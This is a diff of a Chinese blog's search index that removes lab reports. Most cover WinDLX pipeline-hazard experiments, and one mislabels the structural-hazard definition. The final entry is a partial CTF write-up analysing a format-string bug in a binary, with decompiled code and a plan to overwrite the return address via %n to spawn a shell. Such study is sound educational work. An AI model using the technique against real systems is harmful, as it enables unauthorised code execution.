系统中断，输出结果 "The result is 3.000000, 6.000000, ...."</span><br></pre></td></tr></tbody></table></figure>
-<h3 id="分析已优化程序中出现的数据-控制-结构相关">分析已优化程序中出现的数据 / 控制 / 结构相关</h3>
-<div class="tabs" id="res1"><ul class="nav-tabs"><li class="tab active"><a href="#res1-1">优化前</a></li><li class="tab"><a href="#res1-2">优化后</a></li></ul><div class="tab-content"><div class="tab-pane active" id="res1-1"><p><img data-src="image_czojEXSniG.png" alt="优化前程序" title="优化前程序"></p></div><div class="tab-pane" id="res1-2"><p><img data-src="image__c0vohBdpb.png" alt="优化后程序" title="优化后程序"></p></div></div></div>
-<p>优化后的程序的时钟周期从 267 个减少到了 235 个，RAW 相关也从 48 个大大减少到了 16 个，控制相关和结构相关的数量没有改变，由此可见本次所作代码优化对数据相关的改善最大。</p>
-<h3 id="考虑增加浮点运算部件对于性能的影响">考虑增加浮点运算部件对于性能的影响</h3>
-<div class="tabs" id="res2"><ul class="nav-tabs"><li class="tab active"><a href="#res2-1">1 个浮点部件</a></li><li class="tab"><a href="#res2-2">4 个浮点部件</a></li></ul><div class="tab-content"><div class="tab-pane active" id="res2-1"><p><img data-src="image_Da5MgPENTq.png" alt="1个浮点部件" title="1个浮点部件"></p>
-<p><img data-src="image_B7x4cW0ajI.png" alt="1个浮点部件（图2）" title="1个浮点部件（图2）"></p></div><div class="tab-pane" id="res2-2"><p><img data-src="image_G26kibZeDp.png" alt="4个浮点部件" title="4个浮点部件"></p>
-<p><img data-src="image_HpO1C90ynd.png" alt="4个浮点部件（图2）" title="4个浮点部件（图2）"></p></div></div></div>
-<p>同一段代码执行相同步，但是经过对比发现浮点运算部件的增减对于程序执行效率没有影响，可能是因为程序中不存在结构相关，所以并行度没有增加，系统性能没有提升。</p>
-<h3 id="考虑增加forward部件对性能的影响">考虑增加 forward 部件对性能的影响</h3>
-<div class="tabs" id="res3"><ul class="nav-tabs"><li class="tab active"><a href="#res3-1">使用 Forward 组件</a></li><li class="tab"><a href="#res3-2">不使用 Forward 组件</a></li></ul><div class="tab-content"><div class="tab-pane active" id="res3-1"><p><img data-src="image_ksxwWa7qjZ.png" alt="使用Forward组件" title="使用Forward组件"></p></div><div class="tab-pane" id="res3-2"><p><img data-src="image_9ROBHMR9xL.png" alt="禁用Forward组件" title="禁用Forward组件"></p></div></div></div>
-<p>使用 forward 组件后，执行的 cycles 比不适用 forward 组件要少，且产生的 RAW stalls 有明显减少，程序执行的效率提高了很多。在代码优化前，RAW 相关占 48 个 stalls，在优化后，RAW 现象大量减少，数据相关明显改善，提高了代码执行效率。</p>
-<h3 id="观察转移指令在转移成功和转移不成功时的流水线开销">观察转移指令在转移成功和转移不成功时的流水线开销</h3>
-<p><img data-src="image_55nB__dTOL.png" alt="Conditional Branches 输出" title="Conditional Branches 输出"></p>
-<p>本次实验中，转移成功的几率比较大。由于系统按照预测成功来执行指令，当判断转移不成功时，系统对 trap 指令进行的操作全部作废，转而去执行别的指令。这里代码优化对于转移指令没有影响。</p>
-]]></content>
-      <categories>
-        <category>实验</category>
-        <category>计算机组成原理</category>
-      </categories>
-      <tags>
-        <tag>WinDLX</tag>
-        <tag>计算机组成原理</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>DLX 处理器程序设计</title>
-    <url>/2022/10/24/experiments/jizu/programming/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><h2 id="实验目的">实验目的</h2>
-<p>学习使用 DLX 汇编语言编程，进一步分析相关现象</p>
-<h2 id="实验原理">实验原理</h2>
-<p>掌握向量运算算法和编程方法。由于操作数为双精度，需要使用操作浮点双精度的指令。</p>
-<p>本次使用到的指令为</p>
-<ul>
-<li>ADDD 浮点加指令，其命令格式为 <code>rd,rs1,rs2</code>，rs1 和 rs2 将加到 rd 上。</li>
-<li>ADDI 立即数加指令，其命令格式为 <code>rd,rs1,immediate</code>，rs1 和一个立即数将加到 rd 上。</li>
-<li>SD 存储浮点数指令，其命令格式为 <code>offset(rs1),rd</code>，将 rs1 对应空间的数存储在 rd 上。</li>
-<li>LD 读取浮点数指令，其命令格式为 <code>rd,offset(rs1)</code>，将 rs1 对应空间的数取到 rd 上。</li>
-<li>BNEZ 判断指令，其命令格式为 <code>rs1,name</code>，如果 CPR 寄存器不为零，则继续执行 name 部分。</li>
-</ul>
-<h2 id="实验步骤">实验步骤</h2>
-<ol>
-<li>
-<p>自编一段汇编代码，完成两双精度浮点一维向量的加法（或乘除法）运算，并输出结果。向量长度 &gt;=16。</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">.data</span><br><span class="line">VecLen: .word 16</span><br><span class="line">Vector1: .double 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16</span><br><span class="line">; vec1=[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16]</span><br><span class="line">Vector2: .double 2,4,6,8,10,12,14,16,18,20,22,24,26,28,30,32</span><br><span class="line">; vec2=[2,4,6,8,10,12,14,16,18,20,22,24,26,28,30,32]</span><br><span class="line">; 声明向量长度以及两个向量1、2</span><br><span class="line">Printf1: .asciiz "The result is\n"</span><br><span class="line">Printf2: .asciiz "%f\t"</span><br><span class="line"></span><br><span class="line">.align 2</span><br><span class="line"></span><br><span class="line">PrintfHead: .word Printf1</span><br><span class="line">PrintfValue: .word Printf2</span><br><span class="line">result: .space 8</span><br><span class="line">; 打印数据空间的申请</span><br><span class="line"></span><br><span class="line">.text</span><br><span class="line"></span><br><span class="line">main:</span><br><span class="line">addi r14,r0,PrintfHead</span><br><span class="line">trap 5</span><br><span class="line">lw r20,VecLen</span><br><span class="line">addi r2,r0,0</span><br><span class="line"></span><br><span class="line">loop: ; 循环读入向量</span><br><span class="line">ld f0,Vector1(r2)</span><br><span class="line">ld f2,Vector2(r2)</span><br><span class="line">addd f4,f0,f2</span><br><span class="line">; 主要的加法运算</span><br><span class="line">sd result,f4</span><br><span class="line">addi r14,r0,PrintfValue</span><br><span class="line">trap 5</span><br><span class="line">addi r2,r2,8</span><br><span class="line">subi r20,r20,1</span><br><span class="line">bnez r20,loop</span><br><span class="line"></span><br><span class="line">trap 0</span><br><span class="line">; 系统中断，输出结果 "The result is 3.000000, 6.000000, ...."</span><br></pre></td></tr></tbody></table></figure>
-<p>程序，运行结果为下图</p>
-<img data-src="/2022/10/24/experiments/jizu/programming/image_phympq_63F.png" class="">
-<p>数据统计为下窗口所示：</p>
-<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="image_jmdoV6noOX.png" alt=""></div><div class="group-picture-column"><img data-src="image_nIrZXuh4OD.png" alt=""></div></div></div>
-</li>
-<li>
-<p>观察程序中出现的数据 / 控制 / 结构相关。</p>
- <img data-src="/2022/10/24/experiments/jizu/programming/image_30Lxy8oMOz.png" class="">
-<p>数据相关：对当前指令的操作数寄存器进行操作（EX）的时候，前几条指令的运算结果还未写回（WB）结果寄存器，产生了数据相关。</p>
-<p>典型指令组合</p>
- <figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">subi r16,r16,0x1</span><br><span class="line">bnez r16,Loop</span><br></pre></td></tr></tbody></table></figure>
-<p>控制相关：由于系统按照预测成功来执行指令，所以执行 bnez 后会马上将其下一条指令 trap 读取进来</p>
-<p>典型指令组合：</p>
- <figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">bnez r20,Loop</span><br><span class="line">trap 0x0</span><br></pre></td></tr></tbody></table></figure>
-<p>程序中并没有出现结构相关。因为整体仅仅做了一次简单的加法。</p>
-</li>
-<li>
-<p>浮点运算部件带来的影响</p>
-<div class="tabs" id="floats"><ul class="nav-tabs"><li class="tab active"><a href="#floats-1">使用 1 个浮点加法器</a></li><li class="tab"><a href="#floats-2">使用 2 个浮点加法器</a></li></ul><div class="tab-content"><div class="tab-pane active" id="floats-1"><img data-src="/2022/10/24/experiments/jizu/programming/image_CHQj5DasyE.png" class=""></div><div class="tab-pane" id="floats-2"><img data-src="/2022/10/24/experiments/jizu/programming/image_mT6P512ORr.png" class=""></div></div></div>
-<p>增加浮点加法器的数量后，程序执行的性能并未得到提升。</p>
-</li>
-<li>
-<p>Forward 组件的影响</p>
-<div class="tabs" id="forwards"><ul class="nav-tabs"><li class="tab"><a href="#forwards-1">启用 Forward 组件</a></li><li class="tab active"><a href="#forwards-2">禁用 Forward 组件</a></li></ul><div class="tab-content"><div class="tab-pane" id="forwards-1"><img data-src="/2022/10/24/experiments/jizu/programming/image_uFBPKTACNp.png" class=""></div><div class="tab-pane active" id="forwards-2"><img data-src="/2022/10/24/experiments/jizu/programming/image_4mnDTJDUV_.png" class=""></div></div></div>
-<p>关闭 Forward 后，运行时间由 267 个周期增加到 333 个周期，可计算 Forward 技术为该程序带来了 333/267=1.25 的加速比。且 Forward 技术明显减少了 RAW stalls，降低了数据相关的数量。</p>
-</li>
-<li>
-<p>转移指令的影响</p>
-<div class="tabs" id="transfer"><ul class="nav-tabs"><li class="tab"><a href="#transfer-1">转移成功</a></li><li class="tab"><a href="#transfer-2">转移失败</a></li></ul><div class="tab-content"><div class="tab-pane" id="transfer-1"><img data-src="/2022/10/24/experiments/jizu/programming/image_OWjDOo_wJ6.png" class=""></div><div class="tab-pane" id="transfer-2"><img data-src="/2022/10/24/experiments/jizu/programming/image_vaMruizC-Z.png" class=""></div></div></div>
-<p>成功时，已经进入取指阶段的指令会被放弃（aborted），转入转移的目标指令的取指操作，造成流水线断流；若转移失败，已经进入取指阶段的指令继续进入译码阶段，流水线不断流。</p>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>实验</category>
-        <category>计算机组成原理</category>
-      </categories>
-      <tags>
-        <tag>WinDLX</tag>
-        <tag>计算机组成原理</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>指令流水线相关性分析</title>
-    <url>/2022/10/15/experiments/jizu/relation-analysis/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><h2 id="实验目的">实验目的</h2>
-<p>通过使用 WINDLX 模拟器，对程序中的三种相关原理进行观察，并对使用专用通路，增加运算部件等技术对性能的影响进行考察，加深对流水线和 RISC 处理器的特点的理解。</p>
-<h2 id="实验原理">实验原理</h2>
-<p>指令流水线中主要有结构相关、数据相关、控制相关。相关影响流水线性能。</p>
-<h3 id="数据相关">数据相关</h3>
-<p>由于相邻的两条或多条指令使用了相同的数据地址而发生的关联。</p>
-<h3 id="结构相关">结构相关</h3>
-<p>结构相关是指因为程序的执行方向可能被改变而引起的相关。可能改变程序执行方向的指令通常有无条件转移、一般条件转移、复合条件转移、子程序调用、中断等。</p>
-<h3 id="控制相关">控制相关</h3>
-<p>控制相关是指由转移指令引发的相关。</p>
-<h2 id="实验步骤">实验步骤</h2>
-<div class="note info"><h4 id="实验准备">实验准备</h4>
-<p>将浮点运算的延时设为 4 个周期<br>
-<img data-src="/2022/10/15/experiments/jizu/relation-analysis/image_aXqazps9yb.png" class=""></p>
-</div>
-<p>选择 File→Load Code or Data，将 input.s 文件和 fact.s 文件按下图顺序装入主存</p>
-<img data-src="/2022/10/15/experiments/jizu/relation-analysis/image_6o0VQk_-Ji.png" class="">
-<p>使用 WinDLX 模拟器，对 Fact.s 做如下分析：</p>
-<h3 id="观察程序中出现的数据-控制-结构相关，指出程序中出现上述现象的指令组合">观察程序中出现的数据 / 控制 / 结构相关，指出程序中出现上述现象的指令组合</h3>
-<h4 id="数据相关及其组合">数据相关及其组合</h4>
-<p>5 个周期里，Clock Cycle Diagram 窗口的时空图和 Pipeline 窗口中的流图第一次出现了橘黄色的 R-Stall</p>
-<img data-src="/2022/10/15/experiments/jizu/relation-analysis/image_nALPeNEB9z.png" class="">
-<p>点击 <code>seqi r5,r3,0xa</code>，出现的具体信息如下图</p>
-<img data-src="/2022/10/15/experiments/jizu/relation-analysis/image_l4MCfQqj2b.png" class="">
-<p><code>lbu r3,0x0(r2)</code> 要在 WB 周期内写回 R3 的数据，而下一条指令 <code>seqi r5,r3,0xa</code> 要在 intEX 周期内读取 r3 的数据，发生了写后读 RAW，所以为了避免冲突，<code>seqi r5,r3,0xa</code> 的 <code>intEX</code> 指令延迟了一个周期进行。</p>
-<p>指令组合为</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">lbu r3,0x0(r2)</span><br><span class="line">seqi r5,r3,0xa</span><br></pre></td></tr></tbody></table></figure>
-<h4 id="控制相关及其组合">控制相关及其组合</h4>
-<p>在第 4 个时钟周期，第一条命令处于 MEM 段，第二条命令处于 intEX 段，第四条命令处于 IF 段，而第三条命令显示为 aborted。</p>
-<img data-src="/2022/10/15/experiments/jizu/relation-analysis/image_QGI1hfUiiE.png" class="">
-<p>发生 aborted 的原因为，<code>jal InputUnsigned</code> 是无条件分支指令，但只有在第三个时钟周期，<code>jal</code> 指令被译码后才知道。这时，下一条指令 <code>movei2fp</code> 已经取出，但需执行的下一条指令在另一个地址处，因此，<code>movi2fp</code> 的执行应该被取消，在流水线中留下气泡，此处为控制相关。</p>
-<p>指令组合为</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">addi r1,r0,0x1000</span><br><span class="line">jal InputUnsigned</span><br><span class="line">movi2fp,f10,r1</span><br><span class="line">sw SaveR2(r0),r2</span><br></pre></td></tr></tbody></table></figure>
-<h4 id="结构相关及其组合">结构相关及其组合</h4>
-<p>从 Clock Cycle Diagram 中，可以看出指令 stall 了 4 个周期</p>
-<img data-src="/2022/10/15/experiments/jizu/relation-analysis/image_JX5gYYzGzj.png" class="">
-<p><code>addi r2,r2,0x1</code> 与前面的一条指令 <code>add r1,r1,r3</code> 发生了结构相关。由于上一条指令数据相关需要停 4 个周期，在 ID 段停滞，不能进入 intEX 段，故 <code>addi r2,r2,0x1</code> 也不能进入 ID 段，译码部分被占用，故发生了结构相关。</p>
-<img data-src="/2022/10/15/experiments/jizu/relation-analysis/image_Zwun2HbC43.png" class="">
-<p>相关指令组合</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">add r1,r1,r3</span><br><span class="line">addi r2,r2,0x1</span><br></pre></td></tr></tbody></table></figure>
-<h3 id="考察增加浮点运算部件对性能的影响">考察增加浮点运算部件对性能的影响</h3>
-<div class="tabs" id="results"><ul class="nav-tabs"><li class="tab active"><a href="#results-1">count=1</a></li><li class="tab"><a href="#results-2">count=2</a></li></ul><div class="tab-content"><div class="tab-pane active" id="results-1"><p>浮点运算部件的 Count 均为 1</p>
-<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="image_q0ciOGmpYn.png" alt=""></div><div class="group-picture-column"><img data-src="image_b9tWK4nJeR.png" alt=""></div></div></div></div><div class="tab-pane" id="results-2"><p>浮点运算部件的 Count 均为 2</p>
-<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="image_9uzcYEaJhk.png" alt=""></div><div class="group-picture-column"><img data-src="image_jD1hxscOAo.png" alt=""></div></div></div></div></div></div>
-<p>比较各个数据，发现没有变化，无论怎么增加统计结果都一样，由此可见，在该程序中，浮点运算部件的增减对效率没有影响。原因在于，此程序浮点计算指令没有重叠，所以并行度没有增加，性能没有提高。</p>
-<h3 id="考察增加forward部件对性能的影响">考察增加 forward 部件对性能的影响</h3>
-<div class="tabs" id="results-2"><ul class="nav-tabs"><li class="tab"><a href="#results-2-1">不启用 forward 组件</a></li><li class="tab active"><a href="#results-2-2">使用 forward 组件</a></li></ul><div class="tab-content"><div class="tab-pane" id="results-2-1"><p><img data-src="image_qREd2veXyT.png" alt=""></p></div><div class="tab-pane active" id="results-2-2"><div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="image_aJF5rKvDFD.png" alt=""></div><div class="group-picture-column"><img data-src="image_5MH0T4ijzq.png" alt=""></div></div></div></div></div></div>
-<p>由以上截图可以发现：</p>
-<ul>
-<li>增加 forward 组件后所执行总的时钟周期相应有所减少</li>
-<li>增加 forward 组件使得 Stall 的总数有所下降，RAW 的总时钟周期从 29.09% 下降到了 13.64%</li>
-</ul>
-<p>总之，使用 forward 部件后，数据相关减少，性能得到一定的改善</p>
-<h3 id="观察转移指令在转移成功和转移不成功时候的流水线开销">观察转移指令在转移成功和转移不成功时候的流水线开销</h3>
-<p>floating 设置为 2，4，forward 启动时条件转移结果如下图：</p>
-<p><img data-src="image_IBeOkazciZ.png" alt=""></p>
-<p>转移指令一共 6 条，成功转移 2 条，不成功转移 4 条。</p>
-<p>若转移不成功，对流水线执行无影响，流水线吞吐率和效率没有降低。若转移成功，则要废弃预先读入的指令，重新从转移成功处读取指令，每执行一条条件转移指令，一条 x 段流水线就有 x-2 个流水线被浪费掉，执行效率降低，性能有一定损失。</p>
-<h2 id="实验总结">实验总结</h2>
-<p>流水线技术可以提高计算机执行效率，但也有很多不足，当发生一些相关的时候执行就需要延迟，这会影响到流水线的吞吐率，而要保证高效，就需要对代码进行优化处理，这是需要个人的努力的。</p>
-]]></content>
-      <categories>
-        <category>实验</category>
-        <category>计算机组成原理</category>
-      </categories>
-      <tags>
-        <tag>WinDLX</tag>
-        <tag>计算机组成原理</tag>
       </tags>
   </entry>
   <entry>
@@ -5391,102 +5399,6 @@ cp 命令一般用于复制文件或目录。mv 命令一般用于剪切文件�
       </tags>
   </entry>
   <entry>
-    <title>格式化字符串漏洞</title>
-    <url>/2019/11/14/experiments/security/vulnerability_analysis/string-format/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><h2 id="实验目的">实验目的</h2>
-<p>掌握格式化字符串漏洞的原理以及在漏洞利用中的应用。</p>
-<span id="more"></span>
-<h2 id="步骤">步骤</h2>
-<ol>
-<li>
-<p>运行程序，大概走一遍流程 </p><div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/1.png" class=""></div><div class="group-picture-column"><img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/2.png" class=""></div></div></div><p></p>
-</li>
-<li>
-<p>首先，程序接受最大 20 字节长的 “用户名” 和 “密码” 传入，注册成功后，会有三个选项：查看信息，修改信息和退出。</p>
-</li>
-<li>
-<p>用 ida 打开程序，搜索相关标志，发现程序首先调用了 <code>sub_4008BB()</code>，它输出了我们看到的 <code>banner</code>，并冲洗了标准输出（通过调用 <code>fflush(stdout)</code>）。 <img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/3.png" class=""></p>
-</li>
-<li>
-<p>从 <code>sub4008bb</code> 跟回到 <code>main</code> 函数，发现接下来是一个 “注册” 过程，由 <code>sub_400903</code> 函数负责。</p>
- <figure class="highlight c"><figcaption><span>sub_400903</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int8 v12; <span class="comment">// [rsp+1Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Register Account first!"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Input your username(max lenth:20): "</span>);</span><br><span class="line">fflush(<span class="built_in">stdout</span>);</span><br><span class="line">v12 = read(<span class="number">0</span>, &amp;bufa, <span class="number">0x14</span>uLL);</span><br><span class="line"><span class="keyword">if</span> ( v12 &amp;&amp; v12 &lt;= <span class="number">0x14</span>u )</span><br><span class="line">{</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input your password(max lenth:20): "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  read(<span class="number">0</span>, (<span class="type">char</span> *)&amp;a9 + <span class="number">4</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  *(_QWORD *)buf = bufa;</span><br><span class="line">  *(_QWORD *)(buf + <span class="number">8</span>) = a8;</span><br><span class="line">  *(_QWORD *)(buf + <span class="number">16</span>) = a9;</span><br><span class="line">  *(_QWORD *)(buf + <span class="number">24</span>) = a10;</span><br><span class="line">  *(_QWORD *)(buf + <span class="number">32</span>) = a11;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">  LOBYTE(bufa) = <span class="number">48</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"error length(username)!try again"</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  *(_QWORD *)buf = bufa;</span><br><span class="line">  *(_QWORD *)(buf + <span class="number">8</span>) = a8;</span><br><span class="line">  *(_QWORD *)(buf + <span class="number">16</span>) = a9;</span><br><span class="line">  *(_QWORD *)(buf + <span class="number">24</span>) = a10;</span><br><span class="line">  *(_QWORD *)(buf + <span class="number">32</span>) = a11;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> buf;</span><br></pre></td></tr></tbody></table></figure>
-<p>使用 <code>read</code> 函数只将 20 字节数据读入，除此以外，所有的 <code>puts</code> 和 <code>read</code> 后都跟着一个 <code>fflush</code>，强行冲洗缓冲区。看来，缓冲区的毛病应该利用不上了。</p>
-</li>
-<li>
-<p>接下来是 <code>sub_400d2b</code> 函数，这是程序的后半部分 —— 选择输出、修改信息或退出程序。</p>
- <figure class="highlight c"><figcaption><span>sub_400d2b</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    v8 = sub_400A75();</span><br><span class="line">    <span class="keyword">switch</span> ( v8 )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        sub_400B41((__int64)&amp;sa, <span class="number">0LL</span>, v9, v10, v11);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> sub_400D1A(v7, <span class="number">0LL</span>);</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        sub_400B07((<span class="type">char</span>)v7, <span class="number">0</span>, v9, v10, v11, v12);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"error options"</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">    v7 = <span class="built_in">stdout</span>;</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure>
-<ul>
-<li>其中 <code>sub_400a75</code> 输出了三个选项的内容  <figure class="highlight c"><figcaption><span>sub_400a75</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"1.Sh0w Account Infomation!"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"2.Ed1t Account Inf0mation!"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"3.QUit sangebaimao:("</span>);</span><br></pre></td></tr></tbody></table></figure>
-</li>
-<li><code>sub_400b41</code>（选择 2）修改已注册用户名的信息  <figure class="highlight c"><figcaption><span>sub_400b41</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"please input new username(max lenth:20): "</span>);</span><br><span class="line">fflush(<span class="built_in">stdout</span>);</span><br><span class="line">v15 = read(<span class="number">0</span>, &amp;buf, <span class="number">0x12C</span>uLL);</span><br><span class="line"><span class="keyword">if</span> ( v15 &lt;= <span class="number">0</span> || v15 &gt; <span class="number">20</span> )</span><br><span class="line">{</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"len error(max lenth:20)!try again.."</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  *(_QWORD *)s = sa;</span><br><span class="line">  *(_QWORD *)(s + <span class="number">8</span>) = a8;</span><br><span class="line">  *(_QWORD *)(s + <span class="number">16</span>) = desta;</span><br><span class="line">  *(_QWORD *)(s + <span class="number">24</span>) = a10;</span><br><span class="line">  *(_QWORD *)(s + <span class="number">32</span>) = a11;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">  <span class="built_in">memset</span>(&amp;sa, <span class="number">0</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">  <span class="built_in">strcpy</span>((<span class="type">char</span> *)&amp;sa, &amp;buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"please input new password(max lenth:20): "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  v14 = read(<span class="number">0</span>, &amp;src, <span class="number">0x12C</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( v14 &amp;&amp; v14 &lt;= <span class="number">0x14</span>u )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">memset</span>((<span class="type">char</span> *)&amp;desta + <span class="number">4</span>, <span class="number">0</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">    sub_400AE5(&amp;src, <span class="number">0LL</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="type">char</span> *)&amp;desta + <span class="number">4</span>, &amp;src, v14);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    *(_QWORD *)s = sa;</span><br><span class="line">    *(_QWORD *)(s + <span class="number">8</span>) = a8;</span><br><span class="line">    *(_QWORD *)(s + <span class="number">16</span>) = desta;</span><br><span class="line">    *(_QWORD *)(s + <span class="number">24</span>) = a10;</span><br><span class="line">    *(_QWORD *)(s + <span class="number">32</span>) = a11;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"len error(max lenth:10)!try again.."</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    *(_QWORD *)s = sa;</span><br><span class="line">    *(_QWORD *)(s + <span class="number">8</span>) = a8;</span><br><span class="line">    *(_QWORD *)(s + <span class="number">16</span>) = desta;</span><br><span class="line">    *(_QWORD *)(s + <span class="number">24</span>) = a10;</span><br><span class="line">    *(_QWORD *)(s + <span class="number">32</span>) = a11;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
-</li>
-<li><code>sub_400D1A</code>（选择 3）输出了退出信息</li>
-<li><code>sub_400B07</code>（选择 1）输出了用户的信息  <figure class="highlight c"><figcaption><span>sub_400b07</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line">write(<span class="number">0</span>, <span class="string">"Welc0me to sangebaimao!\n"</span>, <span class="number">0x1A</span>uLL);</span><br><span class="line marked"><span class="built_in">printf</span>(&amp;formata, <span class="string">"Welc0me to sangebaimao!\n"</span>);</span><br><span class="line marked"><span class="keyword">return</span> <span class="built_in">printf</span>((<span class="type">const</span> <span class="type">char</span> *)&amp;a9 + <span class="number">4</span>);</span><br></pre></td></tr></tbody></table></figure>
-<ul>
-<li>显然此处存在格式化字符串漏洞，在输出用户名和密码时都使用了 <code>printf(buf)</code> 的格式。</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>
-<p>确定保护</p>
- <figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">checksec --file pwnme_k0</span><br></pre></td></tr></tbody></table></figure>
- <img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/5.png" class="">
-<ul>
-<li>本题开启了 RELRO 保护，将不能对 GOT 表进行写操作，但可以通过覆写返回地址获取 shell。采用的思路是：先泄露出返回地址字段的位置，然后利用 <code>%n</code> 实现覆写。</li>
-</ul>
-</li>
-<li>
-<p>开始利用</p>
-<ul>
-<li>
-<p>在 <code>4008a6</code> 处找到了 <code>/bin/sh</code> 字符串，结合下方的 call system，这里实现了一个完整的 <code>system('/bin/sh')</code>，因此只要把返回地址写成这个地址就可以了。</p>
- <img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/6.png" class="">
-</li>
-<li>
-<p>那么，返回地址在哪里呢？就从那个有漏洞的 <code>sub_400b07</code> 下手。</p>
-</li>
-</ul>
-</li>
-<li>
-<p>在 <code>0x400b28</code> 的 <code>printf</code> 上下断点</p>
- <img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/7.png" class=""> <img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/8.png" class="">
- <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/9.png" class=""></div><div class="group-picture-column"><img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/10.png" class=""></div></div></div>
-</li>
-<li>
